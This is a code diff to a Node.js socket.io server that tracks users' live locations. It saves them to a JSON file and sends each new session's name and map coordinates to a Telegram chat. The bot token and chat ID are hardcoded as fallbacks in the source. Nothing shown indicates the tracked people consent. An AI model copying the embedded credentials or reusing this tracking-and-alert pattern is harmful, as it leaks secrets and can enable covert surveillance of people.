@@ -3,6 +3,7 @@ import { createServer } from 'http';
 import { Server } from 'socket.io';
 import path from 'path';
 import { fileURLToPath } from 'url';
+import fs from 'fs'; // NEW: File System module to save data permanently
 
 const app = express();
 const server = createServer(app);
@@ -12,27 +13,44 @@ const __dirname = path.dirname(fileURLToPath(import.meta.url));
 // Serve React App
 app.use(express.static(path.join(__dirname, 'dist')));
 
-// 1. PERSISTENT STORAGE (In-Memory)
+// 1. PERSISTENT FILE STORAGE
+const DATA_FILE = path.join(__dirname, 'users.json');
 let trackedUsers = {};
 
+// Load existing data from the file when the server starts
+if (fs.existsSync(DATA_FILE)) {
+  try {
+    trackedUsers = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
+    // Mark everyone as offline initially upon server reboot
+    Object.keys(trackedUsers).forEach(id => {
+      trackedUsers[id].status = 'offline';
+    });
+    console.log(`✅ Loaded ${Object.keys(trackedUsers).length} saved users from database.`);
+  } catch (err) {
+    console.error("❌ Failed to load users.json:", err);
+  }
+}
+
+// Helper function to save data to the file
+const saveUsersToFile = () => {
+  try {
+    fs.writeFileSync(DATA_FILE, JSON.stringify(trackedUsers, null, 2));
+  } catch (err) {
+    console.error("❌ Failed to save to users.json:", err);
+  }
+};
+
+// 2. TELEGRAM NOTIFICATIONS
 const sendTelegramAlert = async (name, lat, lng) => {
   const token = process.env.TELEGRAM_BOT_TOKEN || '8675032884:AAHwrxfA52fcHK69LxDY3q9jem8Ky-aw4Hs';
   const chatId = process.env.TELEGRAM_CHAT_ID || '6670686940';
   
-  console.log("🚨 TELEGRAM ALERT TRIGGERED FOR:", name);
-  console.log("👉 Token Found in Render?", !!token);
-  console.log("👉 Chat ID Found in Render?", !!chatId);
+  if (!token || !chatId) return;
 
-  if (!token || !chatId) {
-    console.log("❌ ABORTING: Render Environment Variables are missing!");
-    return;
-  }
-
-  const mapsUrl = `http://googleusercontent.com/maps.google.com/maps?q=${lat},${lng}`;
+  const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
   const message = `🚨 *FROOZY ALERT* 🚨\n\n*${name}* is active!\n\n📍 [View on Google Maps](${mapsUrl})`;
 
   try {
-    console.log("📡 Sending message to Telegram API...");
     const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -45,9 +63,7 @@ const sendTelegramAlert = async (name, lat, lng) => {
     });
     
     const data = await response.json();
-    if (data.ok) {
-      console.log("✅ TELEGRAM MESSAGE SENT SUCCESSFULLY!");
-    } else {
+    if (!data.ok) {
       console.log("❌ TELEGRAM API REJECTED IT:", data.description);
     }
   } catch (err) {
@@ -57,7 +73,7 @@ const sendTelegramAlert = async (name, lat, lng) => {
 
 io.on('connection', (socket) => {
   
-  // FIX: Immediately send current data when an Admin connects/refreshes
+  // Immediately send current data when an Admin connects/refreshes
   socket.emit('users-list', Object.values(trackedUsers));
 
   socket.on('update-location', (userData) => {
@@ -74,6 +90,8 @@ io.on('connection', (socket) => {
       status: 'online'
     };
 
+    saveUsersToFile(); // Save updated location to file
+
     if (isNewSession) {
       sendTelegramAlert(finalName, userData.lat, userData.lng);
     }
@@ -81,22 +99,23 @@ io.on('connection', (socket) => {
     io.emit('users-list', Object.values(trackedUsers));
   });
 
-  // NEW: Handle editing a user's name
+  // Handle editing a user's name
   socket.on('edit-user-name', ({ userId, newName }) => {
     if (trackedUsers[userId]) {
       trackedUsers[userId].name = newName;
+      saveUsersToFile(); // Save name change to file
       io.emit('users-list', Object.values(trackedUsers));
     }
   });
 
-  // NEW: Handle deleting a user
+  // Handle completely deleting a user
   socket.on('delete-user', (userId) => {
     if (trackedUsers[userId]) {
       delete trackedUsers[userId];
+      saveUsersToFile(); // Save deletion to file
       io.emit('users-list', Object.values(trackedUsers));
     }
   });
-
 });
 
 // Periodic cleanup: Mark as offline if no ping in 2 minutes
@@ -112,6 +131,7 @@ setInterval(() => {
   });
   
   if (stateChanged) {
+    saveUsersToFile(); // Save offline statuses to file
     io.emit('users-list', Object.values(trackedUsers));
   }
 }, 10000);
